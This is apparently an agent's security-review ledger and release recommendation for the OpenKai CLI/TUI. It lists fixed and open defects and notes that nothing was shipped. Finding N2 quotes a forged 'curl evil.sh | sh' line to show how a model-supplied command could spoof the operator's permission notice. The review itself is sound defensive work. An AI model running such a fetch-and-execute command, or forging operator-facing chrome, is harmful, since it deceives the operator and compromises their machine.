# E019 qwen3.8-pro pass — findings ledger + go/no-go

**Reviewer:** cole@openkai (security-engineer) · **Date:** 2026-08-21
**Target at dispatch:** main@2618bfc (== release/0.1.007). **origin/main moved
to f048ff5 mid-review** (E002 §2 redaction union landed) — my fixes were
REBASED onto f048ff5, not left on the stale 2618bfc. See "Reconciliation with
origin/main" below.
**Fixes:** `cole/autonomy-c0a3f80f-…`, 8 commits on top of origin/main@f048ff5.
**Handoff:** c0a3f80f (REASSIGNED from ren; codex lane content-refused).
**Mandate:** findings ledger + 0.1.9 go/no-go RECOMMENDATION only. Release
decision stays with the CTO. Nothing shipped (no push, no merge, no publish).

Reproducers live in `packages/cli/test/e019-qwen-repro.test.ts` (S1/S2/S3) and
the gate defects are proven by control runs recorded below.

## Gate integrity FIRST (S4, S5) — both were live, both fixed

| ID | Sev | Where | Defect | Proof at 2618bfc | Fix |
|----|-----|-------|--------|------------------|-----|
| S4 | HIGH (gate) | `package.json` root `test` | `npm test` ran the cli suite without building `dist/`/core, so a clean checkout died with **181 `error TS2307`** before one test ran. The advertised 415/415 was unreachable without an undocumented manual build. | clean `git worktree` of 2618bfc → `npm install` → `npm test` = **exit 2**, 181 TS errors (no test executed). | root `test` now `npm run build && …`. Clean checkout of my tip → `npm test` = **418→423/423**, exit 0. |
| S5 | HIGH (gate, fail-open) | `scripts/security-audit.sh` §1 | In a `.git`-less source archive `git grep` prints "not a git repository"; `\|\| true` swallowed it, so the scan matched nothing yet the script printed **SECURITY AUDIT PASSED** with a planted `sk-` secret in the tree. | archive of 2618bfc + planted canary → `SECURITY AUDIT PASSED`, **exit 0**. Control: same canary in a real git tree → `git grep` catches it. | (a) refuse outside a git work tree (preconditions FAIL); (b) discriminate `git grep` exit 0/1/≥2 instead of `\|\| true`. Archive of my tip + canary → **FAILED (preconditions)**, exit 1. §3 `npm test` now genuinely green at my tip. |

Both gates now do their job. Every other gate number in this pass was
re-derived AFTER these were fixed.

## Behavioural findings (S1, S2, S3) — confirmed with failing reproducers, then fixed

| ID | Sev | File:line | Defect | Reproducer (FAILED @ 2618bfc) | Fix |
|----|-----|-----------|--------|-------------------------------|-----|
| S1 | MEDIUM (trust) | `tui/app.ts` turn_end (was ~2059) | core emits `[error, turn_end]` for `stopReason:"error"`; the settle row rendered an unconditional green **`✓ settled`** right after the danger row — a failed turn read as success. | `e019-qwen-repro.test.ts` "S1": a scripted `stopReason:error` turn rendered `✓ settled`. | error case captures real elapsed (busySince dies with `setBusy(false)`); turn_end renders **`✗ failed in Ns`** + signals "Turn failed"; latch reset in `setBusy(true)` so a close-without-turn_end can't leak to the next turn. |
| S2 | MEDIUM (correctness/corruption) | `tui/composer.ts positionCursorAt` | click-to-cursor fed **grapheme counts** into pi-tui's `cursorCol`, which is a **UTF-16 code-unit** offset, and treated clicked **cells** as grapheme counts. On `"😀😀x"` a click on `x` set the cursor **inside a surrogate pair** — the next insert corrupted the line. | `e019-qwen-repro.test.ts` "S2": click on `x` after two emoji → cursorCol 3 (mid-pair), insert produced mojibake; CJK click landed past end. | explicit two-step conversion: clicked cells → graphemes (`visibleWidth` walk) → code units. Emoji/CJK/past-end covered. |
| S3 | MEDIUM (upgrade safety) | `upgrade.ts runUpgrade` | all three managed channels (brew/bun/npm) dispatched the package manager **before** consulting `--check`/`--rollback`: `--check` performed the real upgrade, `--rollback` forward-upgraded. | `e019-qwen-repro.test.ts` "S3": `--check` on npm lane dispatched `npm install -g …`; `--rollback` also dispatched. | managed `--check` is read-only (exit 0, no dispatch); managed `--rollback` refuses with pin guidance (exit 1, no dispatch). Proven on the injectable npm lane; brew/bun share the guarded shape. |

## Reconciliation with unmerged a23368c (F1/F2/F3)

2618bfc claimed the F1 fix but **never absorbed a23368c** (not an ancestor;
that run died before handback). Reconciled mechanism-by-mechanism and ported:

- **F1** — 2618bfc DID inject a fake `runExternal` (no real spawn — that half
  landed independently), but asserted only the message. Ported a23368c's
  `recordingDeps` argv assertion (`npm install -g @kaidera/openkai@latest`).
- **F2** — bun channel had **zero coverage** at 2618bfc. Ported 3 `isBunManaged`
  detection tests + 2 managed-branch dispatch tests (success + exit-code).
- **F3** — `gradient.ts` still had the `slice(0,-4)` **bare-ESC** bug (fg256
  reset is 5 chars; ESC+`\` is ANSI ST, swallowed on 256-color shells). Ported
  a23368c's regex reset-strip AND hardened the golden test beyond it:
  elapsed/tok-per-s are normalised (observed `⚡1125.0→⚡750.0` between two
  green runs — a23368c's port was flaky-by-construction) with trailing-pad
  stripping. **Control-tested**: corrupt artifact FAILS, restored PASSES — the
  golden is now a real gate, not the write-only snapshot it was.

## Attack-area codecheck verdicts

| Area | Verdict | Basis |
|------|---------|-------|
| 3. Mouse guard (`mouse-guard.ts`) | **CLEAN** | URXVT regex requires 3 numeric params + `M`; no keyboard input uses `M` as a CSI final byte (function keys `~`, kitty `u`, arrows `A-D`). Ordering verified against vendored pi-tui: `TuiAltScreen` registers `handleViewportInput` at construction (tui-alt-screen.js:85), before OpenKai's guard (runtime.ts:514); `inputListeners` is a Set (insertion order) — viewport consumes real SGR first, guard only catches fallback encodings. Tested incl. 2-param CSI-M non-collision. |
| 5. Access/denial (`core/session/tools.ts`, `permission-gate.ts`, `permissions.ts`) | **CLEAN** | `deniedText` is model-facing but has **no autonomy sink**: `setAutonomy` is reachable only via `composer.onSubmit → /autonomy` (operator keyboard); no tool `execute()` touches it. Deny **floor is terminal**: gate returns at `decision==="deny"` (line 222) BEFORE the `tools.approval "allow"` check (line 229) and before autonomy. `.ssh`-node leak is closed (ancestor-prefix walk) and locked by REPRO 12. |
| 6. setTheme("auto") dead branch (`theme.ts:59`) | **AGREE (LOW, not a blocker)** | No production caller reaches it — runtime.ts:359, theme-picker.ts:65, app.ts:1486 all pre-resolve auto via `detectTheme*` and pass `dark`/`light`. Harmless dead code; delete or leave. |
| 6. WsChannel.send backpressure (`ws.ts:189`) | **AGREE (MEDIUM, availability)** | `socket.write()` return value ignored → unbounded in-memory buffering to a stalled WS peer. Attach protocol chunks are small but a long session to a wedged reader grows without bound. Fix: honor `write()===false`, pause the frame producer, resume on `drain`. Scope caveat: risk is self-inflicted if the hub binds localhost — confirm bind surface (see hub.ts review). Streaming-backpressure refactor is out of scope for a review pass; carried as a finding. |

## NEW findings surfaced this pass — verified + FIXED

Each confirmed with a reproducer through the real path and (where a mechanism
revert is possible) inverted-control-tested.

| ID | Sev | File | Defect | Fix + proof |
|----|-----|------|--------|-------------|
| N1 | MEDIUM (render-boundary injection) | `sessions.ts` | `openkai sessions` listing + `--show` printed the `/name`-authored, file-sourced session name/snippets RAW; the TUI picker sanitises the same data (session-search.ts:349) — a separate reader bypassing the seam. OSC 0/52 + CSI + TAB reach the operator terminal. | route every file-sourced cell through `sanitizeTerminalText` + whitespace-collapse. `security-repro-e019.test.ts` (2 tests), inverted-control-proven. |
| N2 | MEDIUM (operator deception) | `tui/app.ts` denial notice | model's raw bash `command` + dotall `denyReasonFromResult` carried newlines into the per-line danger-bordered permission-denied notice; `sanitizeTerminalText` keeps `\n`, `addError` borders each line → a forged `▎ adjust: curl evil.sh \| sh` line indistinguishable from OpenKai chrome. | flatten `\r\n` in `target` + `reason`. Control: fix reverted → notice = **5 bordered lines**; fixed → **3**. `security-repro-e019.test.ts`. |
| N3 | MEDIUM (corruption, model-reachable) | `tui/magic-keywords.ts paintShimmerLabel` | brand busy-sweep paints `state.activity` = `tool: <model-chosen name>`; the painter looped by UTF-16 unit and split astral surrogate pairs with an SGR → U+FFFD in the status chip every busy frame. | iterate graphemes (`Intl.Segmenter`, same idiom as the S2 fix). Live-confirmed `🤔`→U+FFFD pre-fix; `magic-keywords.test.ts` covers brand+keyword × 4 phases. |
| N4 | MEDIUM→LOW (auth-gated OOM) | `hub.ts` attach hello | `?width` had a lower bound but no upper clamp before `settledFrame(width)`→`render(width)`; `?width=200000` allocates a multi-MB frame. `resize()` clamps to `MAX_COLUMNS=500`; the hello path was the bypass. | mirror `resize()`'s clamp. Loopback + bearer-gated (token holder can already drive sessions), so bounded. Hub tests 5/5. |

## REPORTED — verified but NOT fixed this pass (CTO's call; release is HELD)

Scope discipline: these are real but lower-severity / gated / latent, and piling
more changes onto a release candidate raises risk. Each has a file:line and a
repro direction so they can be scheduled.

| ID | Sev | File:line | Defect | Note |
|----|-----|-----------|--------|------|
| R1 | MEDIUM (latent, gated) | `provider-config.ts` `applyEnvEdit`/`canonicalEnvKey` | `${key}=${value}` written to the **trusted** `~/.openkai/.env` with the VALUE validated for `\r\n` but not the KEY; `canonicalEnvKey` unknown-provider branch builds a key from arbitrary `providerId` with no control-char strip. A newline in `providerId` injects an extra env line (e.g. `OPENKAI_AUTO_UPDATE_ENABLED=false`). | **Not reachable from in-repo callers** — `provider-cli.ts:54` rejects non-registry ids; `signin.ts` passes registry envKeys. Gap is the exported ungated surface (module doc names KOS Settings UI as a cross-project caller). Defense-in-depth: strip `[^A-Z0-9_]` from the derived key. |
| R2 | MEDIUM (perf) | `tui/status.ts:151` / `app.ts setActivity` | activity string has NO length cap; brand shimmer repaints it O(n) per 80ms frame. N3 removed the per-char corruption but not the cost: a 300-char model tool name → ~3,800 `colorEscape`/s for one status line. | cheap: `.slice()` the activity to a sane cap (e.g. 120) at `setActivity`. |
| R3 | MEDIUM (affordance lies) | `tui/composer.ts:46` vs `app.ts:270` | shimmer paints per wrapped rendered line (`maskNonProse` can't see multi-line fences); submit-time detection runs on the full buffer. A `` ```\nultrathink\n``` `` draft shimmers but does NOT reroute (and the reverse). | the shimmer is the operator's signal that submit goes multi-model; it disagrees with behaviour for any multi-line construct. Fix needs detection + paint to share one masking pass over the whole buffer. |
| R4 | LOW-MED (correctness) | `tui/magic-keywords.ts:24,27` | keyword boundary lookarounds omit `\p{Cf}`/`\p{M}`, so ZWJ/ZWSP/combining-mark-fused keywords still detect + fire the ultra turn (`foo‍ultrathink`). CJK binds correctly. | add `\p{M}\p{Cf}` to both boundary classes. |
| R5 | LOW-MED (correctness) | `tui/magic-keywords.ts:130-156` | `maskNonProse` misses `<![CDATA[`, `<?…?>`, `<!DOCTYPE>` — a keyword inside pasted XML/PHP both paints and detects, contradicting the "never fires inside XML" contract. | extend `maskTagAt` to the `<!`/`<?` openers. |
| R6 | LOW | `tui/transcript.ts collapseBoot (220-225)` | omits the `reindexOpenTools()` the splice path uses; after boot-notice removal, stale `openTools` indices can mis-settle/OOB a late `tool_result`. Live indices are null-by-invariant; trigger is narrow (`/btw`-or-ultra first turn with an unsettled tool card, no thinking-delta before the stale event). | add `reindexOpenTools()` to `collapseBoot` (symmetry with appendThinking). |
| R7 | LOW | `tui/composer.ts:219` | `shimmerTimer` (`setInterval`) has no `clearInterval`/dispose; each `/new`/`/resume`/fork restart leaks one 120ms interval pinning the dead editor graph. Unref'd (exit not blocked). | add `dispose()` called from runtime teardown; the shimmer test already works around it with a private-field `clearInterval`. |
| R8 | LOW | `hub.ts:206-224` (H2/H3) | MAX_HOSTED TOCTOU (concurrent `POST /sessions` pass the gate before any set); `onEnd` closure can hit a TDZ if the stream is `done` before `host` binds. Loopback+bearer. | H2: move the size check after `await` or reserve a slot; H3: bind `host` before the `onEnd` can fire. |
| R9 | LOW | `ws.ts:126-152` | control frames with FIN=0 or payload >125 accepted (RFC 6455 wants 1002); lone continuation frame silently skipped. Capped, spec-deviation only. | reject per RFC. |
| R10 | LOW | `ws.ts:188` | `WsChannel.send` ignores `socket.write()` backpressure → unbounded buffer to a stalled peer. Loopback attach. | honor `write()===false`, pause the frame producer, resume on `drain`. |
| R11 | LOW (dead code) | `tui/theme.ts:59` | `setTheme("auto")` hardcodes DARK; no production caller reaches it (all pre-resolve via `detectTheme*`). | delete the branch or leave as harmless default. |

### CLEAN (verified no defect)
- **Mouse guard** (area 3): URXVT regex is mouse-specific; listener ordering verified against vendored pi-tui (viewport registers at construction, before the guard; `inputListeners` is an insertion-order Set).
- **Access/denial floor** (area 5, structural): `deniedText` has no autonomy sink; deny-floor return precedes the `tools.approval "allow"` check; `.ssh` node covered by REPRO 12.
- **Turn-aliveness areas 1 & 2**: `appendThinking` splice corrects all indices + `reindexOpenTools`; pulse/settle guard on `!revealed`.
- **fuse.ts consent** (round-3): absent `approveGate` fails closed; repair path re-consents.
- **headless-host.ts, ws.ts core decoder**: clamp/pump/composite math guarded; 4 MiB cap + mask enforcement before buffering.
- **Test hygiene**: no class-(c) real external effect — every `runUpgrade`/`Upgrader` injects deps; provider/skills fetches are faked or loopback. (Housekeeping: several tests use fixed `/tmp/ok-*-<id>` session roots that collide across concurrent working copies and don't clean up — pre-existing, non-security.)

## Reconciliation with origin/main (moved past the dispatch SHA mid-review)

At dispatch, target == 2618bfc. During the review, **origin/main advanced to
f048ff5** (the E002 §2 redaction union). f048ff5 modified THREE files I also
fixed — complementary, not conflicting:

| File | origin/main (f048ff5) | this pass | union applied |
|------|-----------------------|-----------|---------------|
| `sessions.ts` | `redactSecrets` in `contentSnippet` + at row construction | `cleanCell` (ESC/OSC/control strip + whitespace) in listing + `--show` | `cleanCell(redactSecrets(text), 60)` — redact BEFORE slice, then strip escapes |
| `tui/app.ts` | `messageText` replay redaction (export + `redactSecrets`) | S1 settle row + denial-notice `\r\n` flatten (different functions) | both, no logical overlap |
| `scripts/security-audit.sh` | added `tgp_v1_` (Together) to the pattern | fail-closed outside a git tree + git-grep exit discrimination | both — the discriminating scan carries `tgp_v1_` |

My 8 commits were **rebased onto f048ff5** (the lockfile-sync commit was dropped
— already upstream). Shipping the stale 2618bfc+mine would have REGRESSED
origin/main's E002 redaction and the `tgp_v1_` pattern; the rebased tip carries
both. Backup tag: `e019-cole-prebase-backup`.

## Suite + gates at my tip (final, on top of origin/main@f048ff5)

`npm test` (with the S4 build-first fix, real build) = **435/435**, 0 fail,
deterministic across two clean runs. That is origin/main's 423 base + my 12:
- +3 `e019-qwen-repro.test.ts` (S1, S2, S3)
- +5 `upgrade.test.ts` (F2 bun: 3 `isBunManaged` + 2 managed-branch); F1 npm test rewritten in place
- +3 `security-repro-e019.test.ts` (N1 listing, N1 --show, N2 denial-injection)
- +1 `magic-keywords.test.ts` (N3 surrogate)
(origin/main@f048ff5 already carries the E002 redaction tests + the a23368c
golden/bun work that landed independently, so its own baseline is 423 not 415.)

`bash scripts/security-audit.sh` at my tip = **PASSED** (all three sections
genuinely executed — S5 fix control-confirmed: the same run FAILS in a
`.git`-less archive; S4 confirmed: clean-checkout `npm test` builds first).

**Housekeeping (non-blocking):** several TUI tests use fixed `/tmp/ok-tui-<id>`
session roots that collide across concurrent runs (one transient 1/435 failure
observed, cleared on isolation). Pre-existing; flagged for a followup that
randomises the roots.

## 0.1.9 go/no-go — RECOMMENDATION (release decision stays with the CTO)

**Recommendation: GO for the 0.1.9 cut FROM THE REBASED TIP (origin/main@f048ff5 + my 8 commits), with R1–R3 as fast-follows.**

Rationale:
- The two **gate defects (S4, S5) were the load-bearing risk** — both gates
  could report green without doing their job. Both are fixed and the gates now
  genuinely execute; every other number in this pass rests on that.
- All five salvaged findings (S1–S5) are confirmed and fixed; the four NEW
  findings (N1–N4), including two operator-facing render-boundary injections,
  are fixed and reproducer-locked.
- No **HIGH** remains open. The open items (R1–R11) are MEDIUM-or-lower and
  either gated shut (R1), perf/affordance (R2, R3), or LOW correctness/spec.
- **Ship the REBASED tip, not 2618bfc and not the un-rebased branch.** 2618bfc
  fails its own `npm test` on a clean checkout (S4) and its gate is fail-open
  (S5); the un-rebased branch would regress origin/main's E002 redaction +
  `tgp_v1_`. The rebased tip is the union of both lines: 435/435, gate PASSED.
- Fast-follow before or right after the cut: R1 (env-key strip — cheap
  defense-in-depth on a trusted-file writer), R2 (activity cap), R3 (shimmer
  vs detection parity — it misleads the operator about routing).

**Merge note for the integrator:** the branch is rebased onto origin/main, so
it fast-forwards. Do not cherry-pick individual commits back onto 2618bfc — the
sessions.ts / app.ts / security-audit.sh unions depend on f048ff5 being present.

This is a recommendation only. **Nothing was shipped** (no push, merge, or publish).

## 2026-08-21 correction — go/no-go RE-ISSUED (handoff c2bc17cb)

The 435/435 claim above was measured on a 67-char autonomy branch and was
**checkout-width-dependent**: the golden-frame assertion (8372a7c) normalised
the branch chip but not the chrome row's interior pad, so the committed
evidence encoded the generating checkout's branch-name length (the chip is 12
cols for names >8 chars, narrower below). On any checkout named ≤7 chars —
including `main` (4) — `npm test` went 434/435 and `security-audit.sh` §3
reported FAILED at the very tip recommended for the cut. Reproduced at
b4d6dd4 in a fresh worktree (npm install, real build, checkouts verified):
branch `wchk` (4 chars) → 434/435 FAIL; `wchk12345678` (12 chars) → 435/435.

Fixed by merging the qwen tip into main's lineage and collapsing interior
space runs on the (post-substitution) `git:<branch>` row of the golden
normalisation. The assert is untouched — control run: a reintroduced stray
escape byte (F3 class) fails the test (439/441), clean again after revert
(441/441). Evidence regenerated under the new normalisation on the 66-char
branch `cole/autonomy-c2bc17cb-5086-47e9-bd53-a3e9e306c76b-1f1e5535-66e7-4e`.

**Corrected suite claim: `npm test` = 441/441 at the merged tip.** That is
the 435 above + 6 from main-side work landed after the qwen branch forked:
provider-config lane guards (multi-key refuse, single-key untouched,
cloudflare two-key, duplicate-key collapse), OPENKAI_IGNORE_PROJECT_ENV
precedence, and the gradient bare-ESC CSI test. Verified green on 4-char,
12-char, and 66-char checkouts of the same tree; `security-audit.sh` =
SECURITY AUDIT PASSED, exit 0 (measured unpiped), on the 4-char checkout.
The count holds on `main`: main fast-forwards to this tip, and `main` is
itself a 4-char checkout — the failing configuration above, now green.

**Re-issued recommendation: GO for the 0.1.9 cut FROM MAIN at this tip.**
Main now carries the full union — origin/main@f048ff5 (E002 redaction) +
local-main provider-config work + the qwen pass + the width-independent
golden. Note for the CTO: local main and origin/main had diverged
(f048ff5 was never in local main's history); this tip is their
reconciliation. Cutting 0.1.9 requires pushing it to the release line —
that push, like the release, stays with the CTO. R1–R3 fast-follows
unchanged. Recommendation only; nothing is published by this correction.
